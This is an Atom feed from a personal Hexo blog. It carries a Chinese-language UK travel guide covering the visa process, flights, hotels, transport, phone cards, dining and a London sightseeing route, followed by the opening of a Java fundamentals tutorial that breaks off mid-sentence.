<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Dearest_Xia</title>
  
  
  <link href="http://zephyr-cyber.github.io/atom.xml" rel="self"/>
  
  <link href="http://zephyr-cyber.github.io/"/>
  <updated>2023-03-02T02:58:00.206Z</updated>
  <id>http://zephyr-cyber.github.io/</id>
  
  <author>
    <name>ChaunceyZhang</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>England攻略</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/97430584.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/97430584.html</id>
    <published>2023-03-01T02:40:45.000Z</published>
    <updated>2023-03-02T02:58:00.206Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>如何在线申请办理英国签证</p></blockquote><p>首先，不推荐去找代办服务！！因为最后都是需要你亲自到签证中心去录取生物识别信息的（就是按指纹）没有必要多花几百块的冤枉钱，完全可以自己在网上申请然后去就近的签证中心递交材料，目前国内有15个签证中心可以办理，可以在签证申请中心查看离你最近的预约前往办理，网站还有各种附加服务可以选择但是价格都比较贵。</p><ul><li>Step1</li></ul><p>首先大家需要访问申请网站，可以选择中文，然后选择签证地点为中国，然后点击Visit or Transit Visa。</p><ul><li>Step2</li></ul><p>在线填写申请表之前需要先建立一个帐号，设置邮箱和密码。注册帐号后会收到确认邮件以及申请链接。填写表格时需要一些基本信息，比如申请人的姓名、邮件、联系电话、护照号、身份证号、家庭住址、婚姻状况、工作信息、旅行具体信息等。</p><ul><li>Step3</li></ul><p>建立账号后大家就可以在线填写申请表了，这里需要注意要用<strong>英文(地址那里可以用ping yin)填写</strong>，申请后需要在线支付全部款项（接受支付宝、银联卡等），填写后打印申请表。</p><ul><li>Step4</li></ul><p>根据提示在线预约去离你最近的英国签证申请中心递交申请材料（打印出来的申请表需要签名然后和其他所需材料一同放入申请材料中 ），按指纹和照相。现在接受Standard Visitor Visa的英国签证申请中心在北京，武汉，沈阳，济南，重庆，成都，上海，杭州，南京，广州，深圳，福州等均有设点，可以在上文的连接查看各个签证中心的联系方式及地址信息，按时间前往签证中心，会采集手印等生物信息。</p><blockquote><p>申请英国普通访客签证需要提供什么材料？</p></blockquote><ol><li>有效护照或者国际旅行文件（护照要有两面空白页，并且在你往返英国这段期间内是有效的，如果有旧护照也带上）；</li><li> 可以支付在英国停留期间花费的资金证明，比如6个月的银行证明或工资单；</li><li> 有关工作或学校的具体信息，如果是自营职业者需要提供商业注册文件；</li><li> 关于旅行的具体信息，比如往返日期、费用、访问城市等（申请表格上需要填写），不过没有特殊要求<strong>不需要</strong>提供酒店机票预订单；</li><li> 每个申请人的情况不同，有可能还会要求提供更多材料，大家一定要对照官网的材料指南审核文件。所有材料大家都需要<strong>提交原件和复印件</strong>并且<strong>翻译成英文或威尔士文</strong>，并且要提供一份翻译证明，上面要有证明人的签名和翻译日期并且证明该翻译件是对原文件的准确翻译。</li></ol><blockquote><p>英国普通访客签证的申请费用是多少？</p></blockquote><p>在中国大陆申请6个月标准访问签证需要<strong>花费人民币887元</strong>。而长期访问签证Long-Term Visit Visa时间越长越贵，大家也可以去官网查询更详细的申请费用。</p><p><img src="https://imgheybox.max-c.com/bbs/2021/08/07/1038d9f15ba2b9c275ce2594c856bcfe/thumb.png" alt="img"></p><h4 id="全是文字太干巴了所以放一张图"><a href="#全是文字太干巴了所以放一张图" class="headerlink" title="全是文字太干巴了所以放一张图"></a>全是文字太干巴了所以放一张图</h4><blockquote><p>办理英国普通访客签证需要多长时间？</p></blockquote><p>在来英国日期的前三个月就可以开始申请普通访客签证了。大部分申请会在三周内得到回应，但是现在的受理速度又加快了，从中国申请的话大部分10天内就能得到回应，最快的只需要两三个工作日，大家可以查一下所在地区签证中心的处理时间。</p><hr><p><strong>签证到手以后大家就可以着手为自己的行程做准备了，这里主要从机票，住宿，出行，通信，饮食，景点几个方面以伦敦为例简单说一下。</strong></p><blockquote><p>机票预定</p></blockquote><p>这里选择的是某程和某猪2022年五一节上海出发的机票做参考（因为我从浦东飞的比较多）</p><p><img src="https://imgheybox.max-c.com/bbs/2021/08/07/b107c7ea3ecd04a3b840b17b5fc1b65a/thumb.png" alt="img"></p><p><img src="https://imgheybox.max-c.com/bbs/2021/08/07/5cfe59b82d4ea26f52d7586359488c6f/thumb.png" alt="img"></p><p>可以看到经济舱的往返价格大部分在<strong>6000到8000左右，</strong>这里没有截取头等舱的价格，如果盒友们经济情况允许的话可以选择头等舱，往返价格在<strong>2W到8W左右，</strong>毕竟有接近12个小时的航程，如果能躺着睡上一觉是相当的舒服。</p><ol><li><strong>国际航班建议提前三小时到机场以免误机；</strong></li><li><strong>各个航空公司可以允许携带的行李数和重量规定各有不同，定机票的时候查看一下该公司的规定；路上准备一个套在脖子上的枕头，一副降噪耳机；</strong></li><li><strong>最好穿着宽松舒适的衣服和内衣裤登机（避免出现坐几个小时屁股就把内裤吃掉这种事！！真的很不舒服）</strong></li><li><strong>快降落的时候，空姐会在飞机上发入境卡，卡片上需要填一些基本信息例如护照上的姓名，护照号，航班号，来英住址等都是英文填写，如果没有领到的话可以跟空姐说要一张Landing card，虽然在机场入境的时候也有，但是会边排队边填挺麻烦的。</strong></li></ol><p>伦敦有几个机场，国内出发的大部分飞机都是飞希斯罗机场的，希斯罗也是伦敦最大最繁忙的机场了同时各个航站楼都有挺大的免税店。</p><p>飞机落地之后，大家可以跟随着机场的入境标志（Arrivals）一路来到入境检查处（Immigration Control）。希思罗机场的入境检查处有两条通道，一条是欧盟（EU）、欧洲经济区（EEA）、英国和瑞士公民专用的通道，另一条是除上述人员之外其他所有人的通道。</p><p>国内的游客要从非欧盟（Non-EU）这条通道走。希思罗机场的旅客较多，高峰期的队伍往往排得非常长，所以大家最好一下飞机就尽快往这里走。排队的时候可以先整理一下自己的文件，到时候直接交给工作人员，可以更迅速地通过海关。</p><p>通过边检时大家按照工作人员的指示，到达边检官员的窗口提交材料并回答几个简单问题即可。就亲身经历来讲，提交资料这个过程是非常快速且简单的，一般只会检查你的护照。但是为了防止万一，还是希望第一次入境的盒友们能够参考下面的清单认真准备，并且在登机之前放入随身携带的包包，千万别把它们给托运了</p><ol><li><strong>有效护照以及签证；</strong></li><li><strong>返程机票；</strong></li><li><strong>酒店预订单；</strong></li><li> <strong>旅行计划（行程安排）；</strong></li><li><strong>资金证明。</strong></li></ol><p>一般说来，工作人员会问一些关于你基本情况的问题，比如你的生日，在哪里学习或者工作，是什么专业，准备在英国待多久等等。入境N次，几乎每次被问到的都是这些问题。大家也不要紧张，这不是雅思口语考试，像聊天那样放轻松正常答就好。</p><p>通过入境检查之后就该取行李了。和其他机场一样，希思罗机场的行李提取处会有电子显示屏，上面标明这个传送带上的是哪个航班的行李，大家仔细将自己机票上的航班号与显示屏上的航班号进行核对，确认这是自己需要提取行李的传送带，然后等待行李即可。</p><hr><blockquote><p>住宿预订</p></blockquote><p><img src="https://imgheybox.max-c.com/bbs/2021/08/07/473908cc19faa841377a4306e156dc88/thumb.png" alt="img"></p><p>Booking.com(缤客）可以说是英国数一数二的酒店预订平台。网站支持40多种语言，共有500,000多家住所，遍布全球200多个国家，日均客房预订数超过750,000，缤客上的酒店涵盖各种住宿类型，既有小型的家庭经营旅馆，也有五星级豪华酒店。网站使用起来也非常方便，只要按提示输入你的目的地（或者酒店名）、Check-In和Check-Out的日期以及入住旅客的人数信息，就可以搜到相关的酒店信息。官网链接</p><p><img src="https://imgheybox.max-c.com/bbs/2021/08/07/0ddc3483dea65b4fc478f7c75aa85ad0/thumb.png" alt="img"></p><p>Lastminute是一个成立于1998年的在线旅行休闲网站。它家在酒店预订方面最大的特点就是会提供有较大优惠的住宿，例如参加Top Secret Hotel这个活动的酒店在Lastminute网站上预订可能比其它网站便宜40%。这个活动更有意思的一点就是在预订之前，住客会知道所选房间的相关信息，但是只有确认预订后，才能知道酒店名称，是不是颇有种猜奖的神秘感觉！！万一运气好用超低价住个豪华酒店也说不定。除此之外，Lastminute还有机票加酒店的套餐可以选择。不仅省时省力，遇到优惠打折的时候真的能省下不少银子！</p><p><img src="https://imgheybox.max-c.com/bbs/2021/08/07/df90d6596e8667b088087ca2bb201dde/thumb.png" alt="img"></p><p>Trivago(优栈）酒店搜索预订平台成立于2005年，最大的特点就是比价搜索。用户通过简单点击就可以从200多个酒店预订网站及70多万家酒店中找到最优惠的酒店报价。Trivago平均为每位用户可以省下高达35%的酒店开支。现在Trivago已发展到46个不同的国家和地区，用户可以通过界定城市、旅游景点等多种信息进行酒店搜索，也可以按照酒店设施等其它服务作为搜索条件。</p><p><img src="https://imgheybox.max-c.com/bbs/2021/08/07/97cddd0f634118bf0231dac3b8f8a38e/thumb.png" alt="img"></p><p>Airbnb相信大家比较了解了，是民宿租房平台。对于想了解异地文化的小伙伴是一个很好的选择！用户可以通过房间类型、价格范围等条件筛选喜欢的环境。房间内部不仅会提供沙发或者床，很多甚至是整个房子或者公寓出租的，特别适合短租。每个房子都会有房主的介绍，如果你很想在当地交朋友，还可以选择合住，跟房子的主人或其它房客共享一段美好的异国回忆。Airbnb支持支付宝付款，使用起来非常方便。</p><p>英国住宿的选择还是很多的，伦敦地区的会贵一些，其它城市相对便宜。对在伦敦旅行的人来说，住在伦敦1区会比较方便游览景点，如果想要省钱也可以选择海德公园（Hyde Park）附近，地铁站很多而且住宿相对便宜些。总的来说，大家选择住宿尽量选择在地铁站旁，像是Piccadilly Circus, Victoria, Russel Square, Leicester Square这些地铁站附近的住宿选择很多，而且地理位置也很棒，不过价格就会贵一些了。酒店价格以伦敦的双人住宿价格为例，每晚的价格会根据旅游淡旺季变化，如果是临出发再订酒店的话肯定也会贵一些，这里只是给大家一个参考，热门的酒店大家最好提前预订。</p><p><strong>青年旅社：15镑-60镑/每晚（约合132-527元/每晚）</strong></p><p><strong>连锁快捷酒店：120镑-200镑/每晚（约合1070-1780元/每晚）</strong></p><p><strong>星级酒店：225镑-560镑/每晚（约合2010-5000元/每晚）</strong></p><hr><blockquote><p><strong>出行</strong> </p></blockquote><p>在伦敦出行的话，一般是有地铁、公交车、大巴、火车等公共交通为主，有时为了省时间也会选择出租车，不过价格很贵。城市间出行的话，以火车为主。下面就给大家介绍伦敦市内交通和英国城市间交通要花多少钱。</p><ul><li><strong>地铁</strong></li></ul><p>这个是大部分来到伦敦的人会选择的出行方式，伦敦地铁一共贯穿伦敦9个区（9 Zones），可以理解成北京的环，地铁价格的高低也是以区而定的，跨的区越多，票价越贵。在伦敦坐地铁必备的就是Oyster Card，和咱们在国内使用的交通卡很相似，是一张在伦敦地区都可以使用的智能交通卡，在乘坐地铁Underground，公共汽车Buses，电车Trams，DLR（伦敦码头区轻轨），伦敦1-9区之内的火车，伦敦地上铁（Overground）都可以使用。伦敦各大景点基本集中在伦敦的1-2区。</p><p> <strong>TIPS：</strong>Oyster Card（牡蛎卡）有公共交通日花销上限，到达这个上限后无论再乘坐多少次都是免费的，伦敦1-2区日花销上限是£7，大家可以利用这个规定合理安排出行。</p><p><img src="https://imgheybox.max-c.com/bbs/2021/08/08/430412a5a299513b9a3342b2a6c2e29d/thumb.png" alt="img"></p><p>最普通的一种伦敦交通卡，基本上所有地铁站都有出售。第一天刚到伦敦的时候在希斯罗机场的地铁站就可以买一张，既可以在人工售票处买，也可以在自动售卡机买。这个卡既可以当作先充值、即用即刷（Pay As You Go），也可以充值7日票，此卡需押金5镑，用完可退，但是现在退卡时需携带护照，不然是不能退的。</p><ul><li><strong>公交车</strong></li></ul><p>伦敦部分线路的公交车是24小时运营的（晚间会适当减少车次），公交线路覆盖了整个伦敦。现在在伦敦坐公交车好像不能使用现金了，一律要刷卡，可以使用Oyster Card，单程票价：£1.50。</p><ul><li><strong>出租车</strong></li></ul><p>伦敦打车还是比较贵的，6-13分钟的车程花费大概是£6-£9.40（约合人民币52-85元），10-20分钟车费是£9.20-£14.6（约合人民币80-130元），半个小时£16-£23（约合人民币143-206元），具体大家可以参考英国官网给出的出租车费用参考<strong>，</strong>常见的叫车软件有大家都熟悉的UBER。</p><ul><li><strong>火车</strong></li></ul><p>如果去到伦敦郊区游玩或者要去别的城市，那免不了也要坐火车。英国火车票的主要类型有：价格高但是非常灵活的Anytime（什么时候都能做，适合遇到急事的）、错开上下班高峰出行的Off-Peak（这也是比较常选择的车票类型）、限时特价票Advance。购买火车票的话，推荐大家直接上National Rail的官网，毕竟这样更放心，或者去火车票比价网站Trainline，相当于一个代理商，里面各个火车公司的票都有。火车票价钱要看你去哪儿了，价钱从几镑到几十镑不等，下面给大家从伦敦到牛津、剑桥和爱丁堡的火车票价做参考。</p><p> <strong>从伦敦到牛津或剑桥：£25-£30（约合人民币224-268元）</strong></p><p><strong>从伦敦到爱丁堡：£80（约合人民币715元）</strong></p><ul><li><strong>自驾</strong></li></ul><p>英国总体上还算是个交通便利的国家，尤其是在城市里，但是如果你要去英国的自然景区旅游的话，还是自驾出行是最方便的，如果是和几个朋友或和家人一起出游，自驾不只方便快捷而且还可以看到更多美丽的风景！自驾游除了要持有驾照外，最重要的还要有车。其实有了车以后，不论去哪里都方便多了，比如你从伦敦机场出发到附近的城市，直接开车走既舒适又方便。下面给大家推荐一下英国几个公信度较高的租车公司。</p><p><img src="https://imgheybox.max-c.com/bbs/2021/08/08/56514812917d55b608abb6471868279d/thumb.png" alt="img"></p><p>Europcar国际租车公司于1949年在法国巴黎成立，如今有近3000个营业点驻在一百多个国家，拥有多于20万部车，公司的核心市场是休闲和商业租车。Europcar在欧洲国家很被认可！特别是在英国、德国和法国，官网预订时先付费会比较便宜，如果有租车预定等问题，可以去看看常见问题，里面非常详细。</p><p><img src="https://imgheybox.max-c.com/bbs/2021/08/08/e8683701390ab41d4d1ca13cf5bb4131/thumb.png" alt="img"></p><p>Enterprise在1957年成立，是一家国际公认的租车公司。这家公司服务非常周到，在官网预订后可以更改和免费取消，并且免费接送顾客到租车点办理文件和取车，还车后送顾客到指定地点。而且，在官网上预订时先付费会比较便宜！可以下载他们的APP，随时修改自己的订单。</p><ul><li>中国驾照如何在英国使用</li></ul><p>根据Gov.uk上的信息，持有中国驾照的话，在入境英国后可以使用一年（Up to 12 Months），意思就是这一年大家在英国是可以使用中国驾照租车以及开车的。不过这也不意味着大家可以直接拿着中国驾照就上路，碰到交警查证件的话，一般需要拿上有效驾照原件+翻译件+翻译公证件最为保险。</p><p> 有驾照的盒友最好在国内时就把驾照翻译件准备好，委托有资质的翻译公司或者机构翻译。保险起见，除了准备翻译件，建议大家再去办一个《中国驾照翻译公证件》。驾照翻译公证件是由国内各城市公证处发放的驾照公证件，具备一定的法律效力。需递交3份证件及复印件（本人中国驾照原件及复印件、中国居民身份证原件及复印件、户口本原件及复印件），办理完成时间约3-5个工作日，费用约为200元人民币，不同地区稍有差异。</p><hr><blockquote><p>通信</p></blockquote><p>英国著名的手机运营商有O2、Vodafone、EE、3（Three）、Giffgaff、Lebara等等，在机场内比如希思罗（Heathrow），盖特威克（Gatwick）等都有卖卡店面。除了柜台，有的机场还有自动售卡机，在机场买卡的好处就是如果没信号或者遇到使用问题可以直接找工作人员，能及时使用，不过缺点就是价格略贵。如果不急的话，英国各大超市便利店、报刊亭也都能买到电话卡。另外在国内还能买到Giffgaff的电话卡并且可以直接充值，省去了在英国再买手机卡的麻烦了。大家在买电话卡的时候，要买“pay as you go”类型的sim卡，这种最适合来英国旅游的人使用，买卡后直接使用，话费不够随时充。在这几家运营商中，Giffgaff上网和通话比较便宜，信号也不错，这里就以Giffgaff的收费标准为例：</p><p> <em>*<em>*电话*</em>*<em>：15p/每分钟（约合1.4元/每分钟）*</em>*</em></p><p><strong>上网：5p/MB（约合0.45元/MB）</strong></p><p><strong>短信：5p/每条（约合0.45元/每条）</strong></p><hr><blockquote><p><strong>饮食</strong></p></blockquote><ul><li><strong>快餐店</strong></li></ul><p>英国街边有很多快餐店，比如连锁披萨店以及各种咖啡和快餐店，还有很多街头餐车，基本上£10以内搞定。</p><p> <em>*<em>*人均*</em>*<em>：一杯咖啡£1.5-£2.5（约合13.4-23元）；£8-£15（约合人民币72-134元）*</em>*</em></p><ul><li><strong>西餐厅</strong></li></ul><p>英国的西餐厅是非常多的，有很多特色餐厅</p><p><em>*<em>*人均*</em>*<em>：£10-£30（约合人民币90-270元）*</em>*</em></p><ul><li><strong>米其林</strong></li></ul><p>虽说坊间关于英国本土食物的评论让人不抱有啥希望，但是伦敦却蕴藏着不少让人眼前一亮的特色美食。想去感受一把精致奢华就餐体验的，当然不能错过伦敦高大上的米其林餐厅比如地狱厨师Gordon Ramsay的第一家米其林三星餐厅Restaurant Gordon Ramsay，将英国料理融合法式烹饪技艺的二星The Ledbury、英国美食界的传奇The Fat Duck等等，这里只给大家一个价格参考，具体还要看你点的啥菜配的啥酒。提醒大家的是，米其林餐厅一般都非常火爆，想去就餐的别忘了提前预约。</p><p><strong>一星人均：£40-£80（约合人民币358-715元）</strong></p><p><strong>二星人均：£100-£150（约合人民币893-1340元）</strong></p><p><strong>三星人均：£200左右（约合人民币1787元）</strong></p><ul><li><strong>特色小吃</strong></li></ul><p>当然来了英国，最不能错过的就是英式下午茶了。慵懒安静的下午，街角处晒着小太阳，点上一壶茶，一小块蛋糕，或是几个夹着果酱的司康，多惬意呀。比如英国百年茶庄Whittard of Chelsea、深得女王喜爱的百年老店Fortnum and Mason，除了下午茶，英国的“著名菜系”还有炸鱼薯条、英式早餐（其实挺好吃的）等等，英国很多快餐店里都会卖的。如果你想一次性品尝到最多的英国小吃以及各国异域风情的美食，也可以逛逛Borough Market ，这是伦敦最著名的美食市场，看过卷福的福尔摩斯英剧的盒友应该会对这里很眼熟。</p><p><strong>人均：£8-£20（约合人民币70-175元）</strong></p><hr><blockquote><p><strong>景点</strong></p></blockquote><p>以伦敦为例，景点大多在£8-£30（约合人民币70-268元）不等，但是有很多著名景点是免费的，例如大英博物馆、 泰特现代美术馆、维多利亚和阿尔伯特博物馆、英国国家美术馆、格林威治公园、英国美食集市等。如果在伦敦待上3天以上，想玩透伦敦而且你参观的景点大多是付费的话，也可以办理London Pass，大多数景点都可以提前预订门票，有些景点提前预定还会有优惠。</p><hr><p>这里给大家简单推荐一个伦敦的一日游路线，出去玩嘛，而且是像伦敦这种大都市，怎么也得俗一把，不管你是来三天还是五天，怎么也得先把世界闻名的几个必去的标志性地标打个卡！来充分感受这座城市的魅力。</p><ul><li><strong>大本钟 &amp; 议会大厦 | The Big Ben &amp; House of Parliament</strong></li></ul><p>第一站“伦敦代表”大本钟的脚下，其实大本钟并不是一个独立存在的景点，而它就是英国议会大厦的一部分。大本钟是英国最大的钟，也是世界上第三高的钟楼。不过可惜的是大本钟虽然不收取参观费用，但只有英国公民才可以向自己所在区域的议员申请参观，所以大家就在外面拍拍美景好了。而和大本钟为一体的议会大厦也就是英国议会的所在地，政治家们激烈的辩论，互怼，都是在这里进行的。议会大厦又被称为威斯敏斯特宫（Palace of Westminster）。威斯敏斯特宫是哥特复兴式建筑的代表作之一，1987年被列为世界文化遗产。参观议会大厦有好多Tours可以选择，就算大家对政治没啥兴趣，但这建筑是真的宏伟壮观，值得一看！</p><p>地址：Westminster, London SW1A 0AA</p><p>最近地铁站：Westminster Station</p><ul><li><strong>威斯敏斯特大教堂 | Westminster Abbey</strong></li></ul><p>就在议会大厦旁边的威斯敏斯特大教堂也是特别值得去拍照打卡的地方。教堂整体建筑为哥特式，看上去非常壮观。另外，教堂里有多位杰出名人的墓碑或纪念碑，比如牛顿、丘吉尔、狄更斯等都在威斯敏斯特大教堂设立了墓碑。除此之外，这里也是历代国王加冕登基、举行婚礼庆典的地方，可以说是非常有历史和沉淀感的景点之一了。</p><p>地址：20 Deans Yard, Westminster, London SW1P 3PA</p><p>最近地铁站：Westminster Station</p><ul><li><strong>圣詹姆斯公园 | St. James Park</strong></li></ul><p>圣詹姆斯公园是白金汉宫的后花园！公园里有一条秀气的小河横穿公园，小河和河中小岛是各种水鸟的天堂。天鹅，鸭子，鸳鸯以及各种不知名的鸟类，都与游人和睦相处，有的还主动索要食物，特别可爱。当你通过河上小桥的时候，千万别忘了向北看，有绝美的景色呈现，泰晤士河边的精致建筑掩映在一起，烘托着硕大的伦敦眼，城市的繁华一览无余。</p><p>地址：St. James Park, London SW1A 2BJ</p><p>最近地铁站：St. James Park</p><ul><li><strong>白金汉宫 | Buckingham Palace</strong></li></ul><p>白金汉宫（Buckingham Palace）是英国著名皇家府邸，现任女王伊丽莎白殿下常在此办公，召见首相或是大臣，举行国家庆典或是宴请外宾。如果正好是夏天来的，那就有福了，因为白金汉宫每年的夏季都有对外开放日，所以我们可以不再只是扒在铁门外面眼巴巴地看，而是可以真正地进屋参观女王的家了。皇家卫兵换岗仪式也是必须打卡的项目之一！</p><p>地址：Westminster, London SW1A 1AA</p><p>最近地铁站：St. James Park或Green Park</p><ul><li><strong>格林公园 | Green Park</strong></li></ul><p>格林公园最吸引人的地方要属它的林荫大道了。公园里数不清的粗壮大树直耸入云霄，林荫到夹道两边的树木，更是有上了年纪的厚重感。想象一下，在秋日的午后，阳光华丽丽地透过稀疏的叶子洒在身上，头顶上是摇摇欲坠的金黄，脚底下是微微湿润的金黄，和恋人或者密友并着肩走过，聊聊理想和人生，画面简直不能再美了！</p><p>地址：Green Park, London SW1A 1BW</p><p>最近地铁站：Green Park</p><ul><li><strong>皮卡迪利广场 | Piccadilly Circus</strong></li></ul><p>皮卡迪利广场是个特别繁忙、人头攒动的大十字路口。很多来自世界各地的游客都喜欢站在这个繁华的路口上拍下伦敦“动起来”的样子，每一个在人群中穿梭的人仿佛都装着丰富的故事。</p><p>地址：Piccadilly Circus, London W1D 7ET</p><p>最近地铁站：Piccadilly Circus</p><ul><li><strong>唐人街 &amp;SOHO | Chinatown &amp; Soho</strong></li></ul><p>去唐人街（中国城）当然主要的还是吃吃吃了，毕竟大中华的美食才是王道！如果想着难得来一趟英国，不想吃中餐的话，那就去SOHO转转吧，法餐，意大利菜，西班牙菜、韩餐，日餐，秘鲁菜，以及等等等等，各国的美食应有尽有。</p><p>地址：10 Wardour Street, London W1D</p><p>最近地铁站：Leicester Square</p><ul><li><strong>特拉法加广场 | Trafalgar Square</strong></li></ul><p>如果有留心或者在国内常关注英国的盒友们不难发现，其实特拉法加广场这个名字经常出现在电视新闻中。因为每当大型节日来临的时候，比如在新年当天，这里就会变成狂欢庆祝的圣地，成千上万的伦敦居民会聚集到这里通宵达旦地狂欢。场面相当热闹！作为文化活动的中心，特拉法加广场绝对是伦敦的名胜之一，每年都会吸引众多外国游客来拍照留念。如果你打算在圣诞节来到这里，那就更有的看，有的拍了！每年圣诞来临之际，这里都会摆放一颗又高又大而且还被装饰得闪亮亮的圣诞树，可以说是肥肠有气氛了！</p><p>地址：Trafalgar Square, London WC2N 5DN</p><p>最近地铁站：Charing Cross</p><blockquote><p>选择性景点：国家美术馆（The National Gallery）</p></blockquote><p>以收藏绘画作品为主的国家美术馆也在特拉法加广场附近，如果对美术领域有兴趣的盒友们，不妨可以去美术馆陶冶一下情操。</p><ul><li><strong>皇家骑兵 | Horse Guards</strong></li></ul><p>可以与站岗的骑兵和萌萌的马儿合影，但一定要注意的是，骑兵旁边挂起来的那个黑色牌子提醒大家马儿虽萌，但还是不要随便去触摸它，Horse Guards的位置就在白厅（Whitehall），这里的建筑相当华丽，散发着浓浓的英国古典高贵的气质。</p><p>地址：Whitehall, Westminster, London SW1A 2AX</p><p>最近地铁站：Charing Cross</p><ul><li><strong>选择性景点：丘吉尔博物馆（Churchill War Rooms）</strong></li></ul><p>在皇家骑兵附近，还有个大家可以自行选择是否去参观的丘吉尔博物馆。丘吉尔的博物馆是大英帝国战争博物馆的分馆之一。虽然门面不大，但这里可曾是丘吉尔内阁在战争时期的办公室，西敏市白厅的各政府部门和英国财政部在二战期间都曾在这里办公。博物馆内有两部分，分别是：记录了当时二战期间丘吉尔工作指挥战争的内阁作战部（Cabinet War Rooms），里面陈列了当时使用的书桌、电话、笔记本、密码机、非常逼真的人物场景、而地图室还原封不动地保留了1945年宣布停止使用战时政府时的场景。第二个部分是丘吉尔博物馆（the Churchill Museum），里面记录了丘吉尔的一生，从孩童时期的玩具，在布尔战争期间逃亡时使用的手枪，最爱的书籍，战争时和妻子上百封的书信，大部分都是真品展出，还有各种电影、音频、照片的展览，让人们真真切切地了解这位伟大英国领袖的品质和性情。</p><ul><li><strong>唐宁街10号 | No.10 Downing Street</strong></li></ul><p>唐宁街10号，英国首相的大本营，也是个“上镜率”很高的名字。这个神秘的黑色大门背后出入过无数政界名人，而这条街也是英国首相和重要内阁成员的官邸。不过，这里一直有卫兵和警察把守，外面有锁住的大铁门禁止大众进入内部参观。但大家可以简单拍个照留念，毕竟也是英国领导人的大本营嘛，不过不要拍的太过火啊。</p><p>地址：10 Downing Street, Westminster, London SW1A 2AA</p><p>最近火车站：Westminster Station</p><ul><li><strong>伦敦眼 | London Eye</strong></li></ul><p>伦敦眼，这个永远抹不去”浪漫人设“的摩天轮真的是时时刻刻都在圈粉。坐落在风景如画的泰晤士河畔，因建造之初的目的是为了庆祝新千年，故又名千禧之轮，每个舱可容纳25名左右的乘客，旋转一周大概半小时。夜晚一般是乘坐伦敦眼的最好时机，因为俯瞰角度的伦敦夜景真的很美啊！不过，强烈建议大家提前买票！提前买票！提前买票！</p><p>地址：Lambeth, London SE1 7PB</p><p>最近地铁站：Waterloo</p><blockquote><p>选择性景点：伦敦水族馆（Sea Life London Aquarium） &amp; 伦敦地牢（The London Dungeon）。</p></blockquote><p>如果坐完了伦敦眼，你觉得自己仍然精力充沛，活力满满的话，还可以去就在附近的神秘海底世界 – 水族馆和阴森恐怖的伦敦地牢看看，这两个景点也都是收费的。</p><p><strong>路线总结：大本钟 &amp; 议会大厦 – 威斯敏斯特大教堂- 圣詹姆斯公园 – 白金汉宫 – 格林公园 – 皮卡迪利广场 – 中国城 – 特拉法加广场 – 皇家骑兵 – 唐宁街10号 – 伦敦眼</strong></p><p><img src="https://imgheybox.max-c.com/bbs/2021/08/08/3c6b86b8fb591138c5a4717fe741c97c/thumb.png" alt="img"></p><h4 id="路线图"><a href="#路线图" class="headerlink" title="路线图"></a>路线图</h4><hr><p>以上所有攻略都是建立在疫情好转或者完全被控制的情况下的，现阶段大家还是要遵守各地的防疫措施，非必要不前往境外不给防疫添乱。大家刚好也可以趁着这段时间努力攒钱，等到时机成熟的时候就可以照着攻略带上行李来一场说走就走的旅行啦！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;如何在线申请办理英国签证&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;首先，不推荐去找代办服务！！因为最后都是需要你亲自到签证中心去录取生物识别信息的（就是按指纹）没有必要多花几百块的冤枉钱，完全可以自己在网上申请然后去就近的签证中心递交材料，目前国</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Java基础知识</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/398957599.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/398957599.html</id>
    <published>2023-01-06T02:06:45.000Z</published>
    <updated>2023-02-08T12:28:53.808Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java基础知识"><a href="#Java基础知识" class="headerlink" title="Java基础知识"></a>Java基础知识</h1><h1 id="gt-Java概述"><a href="#gt-Java概述" class="headerlink" title="&gt; Java概述"></a>&gt; Java概述</h1><h2 id="1、何为编程"><a href="#1、何为编程" class="headerlink" title="1、何为编程"></a>1、何为编程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 编程就是让计算机为解决某个问题而使用某种程序设计语言编写程序代码，并最终得到结果的过程。 </span><br><span class="line"></span><br><span class="line">2. 为了使计算机能够理解人的意图，人类就必须要将需解决的问题的思路、方法、和手段通过计算机能够理解的形式告诉计算机，使得计算机能够根据人的指令一步一步去工作，完成某种特定的任务。这种人和计算机之间交流的过程就是编程。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2、什么是-Java"><a href="#2、什么是-Java" class="headerlink" title="2、什么是 Java"></a>2、什么是 Java</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. Java 是一门面向对象编程语言，不仅吸收了 C++语言的各种优点，还摒弃了 C++ 里难以理解的多继承、指针等概念，因此 Java 语言具有功能强大和简单易用两个特征。</span><br><span class="line"></span><br><span class="line">2. Java 语言作为静态面向对象编程语言的代表，极好地实现了面向对象理论，允许程序员以优雅的思维方式进行复杂的编程。 </span><br></pre></td></tr></table></figure><h2 id="3、jdk1-5-之后的三大版本"><a href="#3、jdk1-5-之后的三大版本" class="headerlink" title="3、jdk1.5 之后的三大版本"></a>3、jdk1.5 之后的三大版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1. Java SE（J2SE，Java 2 Platform Standard Edition，标准版） </span><br><span class="line">• Java SE 以前称为 J2SE。它允许开发和部署在桌面、服务器、嵌入式环境和实时环境中使用的Java 应用程序。</span><br><span class="line">• Java SE 包含了支持 Java Web服务开发的类，并为 Java EE 和 Java ME 提供基础。 </span><br><span class="line"></span><br><span class="line">2. Java EE（J2EE，Java 2 Platform 